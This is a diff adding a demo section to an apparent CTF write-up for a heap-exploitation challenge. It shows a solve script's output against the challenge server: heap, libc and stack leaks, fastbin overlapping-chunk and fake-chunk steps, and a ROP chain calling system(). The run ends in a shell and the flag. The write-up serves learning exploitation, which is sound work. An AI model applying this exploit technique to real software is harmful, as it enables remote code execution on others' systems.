@@ -227,3 +227,27 @@ Then write gadgets into main saved RIP.
 ## Solve script
 
 [run.py](./run.py).
+
+Demo:
+```
+> python run.py REMOTE
+[+] Opening connection to monsters.ctf.theromanxpl0.it on port 7009: Done
+[*] LEAK: heap_leak = 0x558cc1b75320
+[*] LEAK: fakechunk_addr = 0x558cc1b75340
+[+] create an overflapping chunk using fastbin: Done
+[+] prepare 2 fakechunks for fake largechunk: Done
+[+] free fake largechunk: Done
+[*] LEAK: libc_leak  = 0x7f9db5411b20
+[+] leaking stack: Done
+[*] LEAK: stack_leak  = 0x7ffd621e9c38
+[*] CALC: main_rip_ptr  = 0x7ffd621e9b08
+[*] Loaded 116 cached gadgets for './libc.so.6'
+0x0000:   0x7f9db531903c pop rdi; ret
+0x0008:   0x7f9db53d944a [arg0] rdi = 140315327304778
+0x0010:   0x7f9db525af30 system
+[+] rop main: Done
+[+] duration: 67.11265683174133
+[*] Switching to interactive mode
+uid=1000(user) gid=1000(user) groups=1000(user)
+TRX{wh0_th3_fuck_kn0w5_4b0u7_f457B1n5?!_153CA0}
+```
